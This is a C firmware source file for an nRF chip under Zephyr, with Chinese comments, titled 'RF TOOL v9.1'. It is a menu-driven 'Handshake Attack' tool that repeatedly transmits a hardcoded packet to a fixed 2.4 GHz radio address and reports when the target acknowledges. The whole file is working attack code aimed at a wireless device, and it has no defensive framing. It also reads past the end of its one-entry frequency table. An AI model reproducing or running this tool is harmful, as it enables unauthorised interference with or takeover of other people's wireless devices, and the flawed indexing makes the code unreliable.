#include <zephyr/kernel.h>
#include <zephyr/sys/printk.h>
#include <hal/nrf_radio.h>
#include <zephyr/usb/usb_device.h>
#include <zephyr/drivers/gpio.h>
#include <zephyr/drivers/uart.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h> // 需要用到 abs() 取絕對值

// ================= 參數設定 =================
static const uint8_t TARGET_FREQS[] = {4};
#define TARGET_ADDR_BASE   0xd235cf35
#define TARGET_ADDR_PREFIX 0x00

// ================= 握手數據 =================
static uint8_t HANDSHAKE_PACKET[] = {
    0x15, 0x20, 0x40, 0x07, 0xC0, 0x00, 0x00, 0x05, 
    0x50, 0x00, 0x04, 0x88, 0x00, 0x53, 0x22, 0xE5, 
    0x2B, 0x90, 0x01, 0x97, 0xEA, 0x1F, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// ===========================================

#define LED0_NODE DT_ALIAS(led0)
static const struct gpio_dt_spec led = GPIO_DT_SPEC_GET(LED0_NODE, gpios);
const struct device *uart_dev = DEVICE_DT_GET(DT_CHOSEN(zephyr_console));

static uint8_t packet_buffer[64];
static bool attack_active = false;
static bool swap_address = false;

// ★ 用來記錄上一次狀態的變數
static bool last_ack_state = false; // 上次是否有收到 ACK
static int8_t last_rssi = 0;        // 上次的訊號強度

uint32_t reverse_32(uint32_t n) {
    return ((n>>24)&0xff) | ((n<<8)&0xff0000) | ((n>>8)&0xff00) | ((n<<24)&0xff000000);
}

void radio_emergency_reset(void) {
    NRF_RADIO->SHORTS = 0;
    NRF_RADIO->TASKS_DISABLE = 1;
    k_sleep(K_MSEC(1)); 
    NRF_RADIO->EVENTS_DISABLED = 0;
}

void radio_init_handshake(void) {
    NRF_RADIO->POWER = 0;
    k_sleep(K_MSEC(1));
    NRF_RADIO->POWER = 1;
    
    NRF_RADIO->TXPOWER = (RADIO_TXPOWER_TXPOWER_Pos8dBm << RADIO_TXPOWER_TXPOWER_Pos);
    NRF_RADIO->CRCCNF = (RADIO_CRCCNF_LEN_Two << RADIO_CRCCNF_LEN_Pos);
    NRF_RADIO->CRCPOLY = 0x11021; 
    NRF_RADIO->CRCINIT = 0xFFFF;
    NRF_RADIO->MODE = NRF_RADIO_MODE_BLE_2MBIT; 
    
    NRF_RADIO->PCNF0 = (8UL << RADIO_PCNF0_LFLEN_Pos);
    NRF_RADIO->PCNF1 = (32UL << RADIO_PCNF1_STATLEN_Pos) | 
                       (32UL << RADIO_PCNF1_MAXLEN_Pos)  | 
                       (4UL  << RADIO_PCNF1_BALEN_Pos)   | 
                       (1UL  << RADIO_PCNF1_ENDIAN_Pos);
    
    NRF_RADIO->BASE0 = TARGET_ADDR_BASE;
    NRF_RADIO->PREFIX0 = TARGET_ADDR_PREFIX; 
    NRF_RADIO->TXADDRESS = 0; 
    NRF_RADIO->RXADDRESSES = 1; 
}

void send_handshake(uint8_t freq) {
    // 燈號：攻擊中亮燈
    gpio_pin_set_dt(&led, 1);

    NRF_RADIO->SHORTS = 0;
    NRF_RADIO->TASKS_DISABLE = 1;
    
    int timeout = 5000;
    while (NRF_RADIO->EVENTS_DISABLED == 0 && timeout > 0) {
        timeout--;
        k_busy_wait(1); 
    }
    NRF_RADIO->EVENTS_DISABLED = 0;

    if (timeout <= 0) {
        radio_init_handshake();
        return; 
    }

    NRF_RADIO->FREQUENCY = freq;
    
    if (swap_address) NRF_RADIO->BASE0 = reverse_32(TARGET_ADDR_BASE);
    else NRF_RADIO->BASE0 = TARGET_ADDR_BASE;

    memcpy(packet_buffer, HANDSHAKE_PACKET, 32); 
    NRF_RADIO->PACKETPTR = (uint32_t)packet_buffer;

    NRF_RADIO->SHORTS = RADIO_SHORTS_READY_START_Msk | 
                        RADIO_SHORTS_END_DISABLE_Msk | 
                        RADIO_SHORTS_DISABLED_RXEN_Msk |
                        RADIO_SHORTS_RXREADY_START_Msk;

    NRF_RADIO->TASKS_TXEN = 1;

    int64_t deadline = k_uptime_get() + 5; 
    bool ack_received = false;
    bool job_done = false;

    while (k_uptime_get() < deadline) {
        if (NRF_RADIO->EVENTS_END) {
            if (NRF_RADIO->CRCSTATUS == 1) {
                ack_received = true;
            }
            NRF_RADIO->EVENTS_END = 0;
            job_done = true;
            break; 
        }
        k_busy_wait(10);
    }

    if (!job_done) {
        radio_emergency_reset();
    } else {
        NRF_RADIO->SHORTS = 0;
        NRF_RADIO->TASKS_DISABLE = 1;
    }

    // 發送結束：滅燈
    gpio_pin_set_dt(&led, 0);

    // ==========================================
    // ★ 智慧日誌過濾邏輯 (Smart Logging) ★
    // ==========================================
    if (ack_received) {
        int8_t rssi = -(int8_t)NRF_RADIO->RSSISAMPLE;

        // 情況 1: 剛連上 (上次沒連上，這次連上了)
        if (!last_ack_state) {
            printk("\n>>> [TARGET LOCKED!] Connected on %d MHz | RSSI: %d\n", 2400+freq, rssi);
            // 剛連上時狂閃慶祝一下
            for(int i=0; i<3; i++) { gpio_pin_toggle_dt(&led); k_busy_wait(50000); }
        } 
        // 情況 2: 已連線，但訊號強度變化超過 3 dBm (代表有移動或變化)
        else if (abs(rssi - last_rssi) > 3) {
            printk(">>> [UPDATE] RSSI Changed: %d dBm\n", rssi);
        }
        // 情況 3: 穩定連線中，數據沒變化 -> 什麼都不印，或者只印一個點
        // (這裡我們保持安靜，只閃燈)

        // 更新狀態記憶
        last_ack_state = true;
        last_rssi = rssi;

        // 成功時慢速閃燈指示
        gpio_pin_toggle_dt(&led);
        k_sleep(K_MSEC(100)); 

    } else {
        // 情況 4: 斷線了 (上次是連線，這次斷了)
        if (last_ack_state) {
            printk("\n>>> [LOST] Connection Dropped.\n");
        }
        
        last_ack_state = false;
        // 失敗時不閃燈，不印字，或者只在 main loop 印點
    }
}

void print_menu() {
    printk("\n\n=== RF TOOL v9.1 (Smart Logging) ===\n");
    printk(" [1] START Handshake Attack\n");
    printk(" [6] Swap Address (%s)\n", swap_address ? "SWAPPED" : "NORMAL");
    printk(" [0] STOP\n");
}

void uart_cb(const struct device *dev, void *user_data) {
    uint8_t c;
    if (!uart_irq_update(dev)) return;
    if (!uart_irq_rx_ready(dev)) return;

    while (uart_fifo_read(dev, &c, 1) == 1) {
        switch (c) {
            case '1':
                attack_active = true;
                // 重置狀態，確保重新攻擊時會顯示第一次連線
                last_ack_state = false; 
                printk("\n>>> ATTACK STARTED (Silent Mode) <<<\n");
                break;
            case '6':
                swap_address = !swap_address;
                printk("\n>>> ADDR SWAP: %s <<<\n", swap_address ? "ON" : "OFF");
                break;
            case '0':
                attack_active = false;
                printk("\n>>> STOPPED <<<\n");
                break;
            default:
                print_menu();
                break;
        }
    }
}

int main(void) {
    usb_enable(NULL);
    if (device_is_ready(led.port)) gpio_pin_configure_dt(&led, GPIO_OUTPUT_ACTIVE);
    
    uart_irq_callback_user_data_set(uart_dev, uart_cb, NULL);
    uart_irq_rx_enable(uart_dev);

    radio_init_handshake(); 
    k_sleep(K_SECONDS(2));
    print_menu();

    int freq_idx = 0;
    int log_counter = 0;

    while (1) {
        if (attack_active) {
            send_handshake(TARGET_FREQS[freq_idx]);
            freq_idx = (freq_idx + 1) % 2; 

            // 每 100 次循環印一個點，證明程式還活著 (心跳)
            // 這樣你就不會覺得它當機了，但也不會洗版
            if (++log_counter > 100) {
                printk("."); 
                log_counter = 0;
            }
            
            k_sleep(K_MSEC(5)); 
        } else {
            gpio_pin_toggle_dt(&led);
            k_sleep(K_MSEC(500));
        }
    }
}
